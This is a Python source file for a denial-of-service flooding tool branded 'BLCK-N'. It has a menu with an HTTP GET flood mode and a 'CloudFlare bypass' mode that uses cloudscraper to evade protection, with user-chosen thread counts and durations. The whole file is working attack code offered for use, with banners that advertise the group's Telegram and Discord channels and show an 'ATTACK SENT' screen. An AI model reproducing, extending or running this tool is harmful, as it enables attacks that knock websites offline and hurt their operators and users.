import threading
import datetime
import threading
import requests
import os
import random
import time
import cloudscraper

useragent = open("ua.txt").read().splitlines()

_0_v1 = "\033[1;31m"
red = "\033[38;5;196m"
green_hacker = "\033[1;32m"
clear = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
| github.com/BLCK-N {_0_v1}|{clear} t.me/black_noche {_0_v1}|{clear} Discord {_0_v1}|{clear} discord.gg/blacknoche |
          {_0_v1}
                     ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗            
                     ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝            
                     ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩   {clear}
           {_0_v1}╔═══════════════════════════════════{clear}
           {_0_v1}║{clear}  {_0_v1}-{clear} http     {_0_v1}|{clear} HTTP Flood         
           {_0_v1}║{clear}  {_0_v1}-{clear} cfb      {_0_v1}|{clear} CloudFlare bypass
           {_0_v1}╚═══════════════════════════════════{clear}
                                                                       >>> {green_hacker}Coded by /@{clear} <<<
""")              
    
def layer7():
    while True:
        banner()
        select = input(f"""
╔═══[{_0_v1}root{clear}@{_0_v1}/BLCK-N{clear}]
╚══{_0_v1}>{clear} """)
         
        if select.startswith("http"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{_0_v1}:{clear} {_0_v1}http{clear} <{_0_v1}url{clear}> <{_0_v1}threads{clear}> <{_0_v1}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)
            
            def http_attack(url, secs):
                end_time = time.time() + secs
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, thread, secs):
                for _ in range(thread):
                    t = threading.Thread(target=http_attack, args=(url, secs))
                    t.start()
            
            th(url, threads, secs)
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
github.com/BLCK-N {_0_v1}|{clear} t.me/black_noche {_0_v1}|{clear} Discord {_0_v1}|{clear} discord.gg/blacknoche
                    {_0_v1}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {_0_v1}╔══════════════════════════════════{clear}
      {_0_v1}║{clear} METHODS{_0_v1}:{clear} {_0_v1}[{clear}HTTP{_0_v1}]{clear} 
      {_0_v1}║{clear} URL{_0_v1}:{clear} {_0_v1}[{clear}{url}{_0_v1}]{clear}                
      {_0_v1}║{clear} THREADS{_0_v1}:{clear} {_0_v1}[{clear}{threads}{_0_v1}]{clear}                   
      {_0_v1}║{clear} TIME{_0_v1}:{clear} {_0_v1}[{clear}{secs}{_0_v1}]{clear}                     
      {_0_v1}╚══════════════════════════════════{clear}       
                                                                       >>> {green_hacker}Coded by /@{clear} <<<
""")
            time.sleep(secs)

################################################################################################################################

        elif select.startswith("cfb"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{_0_v1}:{clear} {_0_v1}cfb{clear} <{_0_v1}url{clear}> <{_0_v1}threads{clear}> <{_0_v1}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)
            
            def cloudflare(url, end_time):
                end_time = time.time() + secs
                scraper = cloudscraper.create_scraper()
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        scraper.get(url, headers=headers, timeout=5)
                        scraper.head(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=cloudflare, args=(url, secs))
                    t.start()
            
            th(url, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
github.com/BLCK-N {_0_v1}|{clear} t.me/black_noche {_0_v1}|{clear} Discord {_0_v1}|{clear} discord.gg/blacknoche
                {_0_v1}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                {clear}
        {_0_v1}╔══════════════════════════════════{clear}
        {_0_v1}║{clear} METHODS{_0_v1}:{clear} {_0_v1}[{clear}CloudFlare Bypass{_0_v1}]{clear} 
        {_0_v1}║{clear} URL{_0_v1}:{clear} {_0_v1}[{clear}{url}{_0_v1}]{clear}                
        {_0_v1}║{clear} THREADS{_0_v1}:{clear} {_0_v1}[{clear}{threads}{_0_v1}]{clear}                   
        {_0_v1}║{clear} TIME{_0_v1}:{clear} {_0_v1}[{clear}{secs}{_0_v1}]{clear}                     
        {_0_v1}╚══════════════════════════════════{clear}       
                                                                       >>> {green_hacker}Coded by /@{clear} <<<
            """)
            time.sleep(secs)




            

if __name__ == "__main__":
    layer7()













